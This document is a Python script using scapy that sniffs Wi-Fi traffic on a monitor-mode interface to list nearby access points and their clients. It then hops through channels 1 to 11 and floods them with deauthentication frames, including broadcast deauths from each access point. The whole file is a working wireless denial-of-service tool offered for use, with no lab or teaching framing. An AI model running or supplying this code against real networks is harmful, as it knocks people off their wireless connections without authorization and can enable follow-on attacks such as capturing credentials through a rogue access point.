
#scapy needed for packet sniffing and sending
from scapy.all import *
#threading for the two fucntions to run concurrently
from threading import Thread
#subprocess allows for terminal commands to execute
from subprocess import Popen, PIPE




#channel_hop_n_deth: rotates channels 1-11 infinitely, sending deauthentication packets as it goes
#inputs: clients and hosts global variable lists
#output: terminal output and packets sent
def channel_hop_n_deth(access):
    global chanstr

    channel = 0

    while True:
        #iterates channels loops back to 1 after 11
        channel=channel+1
        if channel ==12:
            channel = 1        
        #gets string of channel, needed for inputs and check
        chanstr = str(channel)       
        #changes the channel on the terminal
        Popen(['iw', 'dev', access, 'set', 'channel', chanstr], stdout=DN, stderr=PIPE)       
        to_send = []

        #loop to add client deauth packets
        if len(clients) > 0:
            print 'Clients:'
            for c in clients:
		print c[0]+'	'+c[1]+'	'+c[2]+'	'+c[3]
                #if client is on the current channel, add deauth packet
                if c[2] == chanstr:
                    packet1 = Dot11(addr1=c[0], addr2=c[1], addr3=c[1])/Dot11Deauth()
                    to_send.append(packet1)

                    packet2= Dot11(addr1=c[1], addr2=c[0], addr3=c[0])/Dot11Deauth()
                    to_send.append(packet1)
        #loop to add hosts deauth packet
        if len(hosts) > 0:
            print 'Hosts:'
            for h in hosts:
                print h[0]+'	'+h[1]+'	'+h[2]
                #if host is on current channel, add deauth packet for that host
                if h[1] == chanstr:
                    packet3 = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=h[0], addr3=h[0])/Dot11Deauth()
                    to_send.append(packet3)
        #send all the packets
        print 'Deauthentication Packets:'
        for packet in to_send:
            print packet.addr1+'	'+packet.addr2+'	'+packet.addr3
            send(packet, inter=0, count=1)


#get_cli_n_hos: get the client and hosts associated with the current sniffed packet
#this function repeats infinitely when called from the scapy sniff function
#inputs:sniffed packet, global chanstr, updated in channel_hop_n_deth
#outputs: clients, hosts lists
def get_cli_n_hos(sniffed):

    global clients, hosts
    #check to ensure is a wi-fi packet
    if sniffed.haslayer(Dot11):
        if sniffed.addr1 and sniffed.addr2:
            sniffed.addr1 = sniffed.addr1.lower()
            sniffed.addr2 = sniffed.addr2.lower()
            #check if it is a request or recieve packet, if so go into host add logic
            if sniffed.haslayer(Dot11Beacon) or sniffed.haslayer(Dot11ProbeResp):
                #get ssid and bssid
                s=sniffed[Dot11Elt].info
                b= sniffed[Dot11].addr3.lower()
                host_bool=0
                #try to get host chan, sometimes this errors, then we just skip this whole section
                try: 
                    host_chan= str(ord(sniffed[Dot11Elt:3].info))
                except:
                    host_bool=1
                is_there=0
                #logic to ensure there is no bssid matching already in hosts, or hosts is empty, then add the new entry
                if host_bool==0:
                    if s!=None and s!='':
                        for h in hosts:
                            if b in h[0]:
                                is_there=1
                        if is_there==0 or len(hosts)==0:
                            hosts.append([b,host_chan,s]) 
            is_there=0
            #check if packet is management or data type, then go into client add logic
            if sniffed.type in [1, 2]:
                #if clients is empty then check if either the send or recieve address of the client match the bssid of a host, if so add the client
                if len(clients)==0:
                    for h in hosts:
                        if (h[0]!=None and h[0].lower() in sniffed.addr1.lower()) or (h[0]!=None and h[0].lower() in sniffed.addr2.lower()):
                            clients.append([sniffed.addr1,sniffed.addr2,h[1],h[2]])
                    return
                #iterate all the clients
                for c in clients:
                    #if a client matches the send and recieve mac address, then do not add the duplicate
                    if sniffed.addr1 in c and sniffed.addr2 in c:
                        is_there=1
                    if is_there==0:
                        #if no hosts, then just add the client, with just the channel attached
                        if len(hosts)==0:
                            clients.append([sniffed.addr1,sniffed.addr2,chanstr])
                        for h in hosts:
                            #check if either the send or recieve address of the client match the bssid of a host and that the client is not already there, if so add the client
                            if ((h[0]!=None and h[0].lower() in sniffed.addr1.lower()) or (h[0]!=None and h[0].lower() in sniffed.addr2.lower())) and [sniffed.addr1,sniffed.addr2,h[1],h[2]] not in clients:
                                clients.append([sniffed.addr1,sniffed.addr2,h[1],h[2]])
if __name__ == "__main__":
    clients = []
    hosts = []
    DN = open(os.devnull, 'w')

    access = 'wlan0mon'
    #sets the interface that scapy uses to wlan0mon
    conf.iface=access
    #this new thread runs function channel_hop_n_deth
    deth = Thread(target=channel_hop_n_deth, args=(access,))

    deth.start()
    #other thread runs get_cli_n_hos repeatedly with new sniffed input
    sniff(iface=access, store=0, prn=get_cli_n_hos)
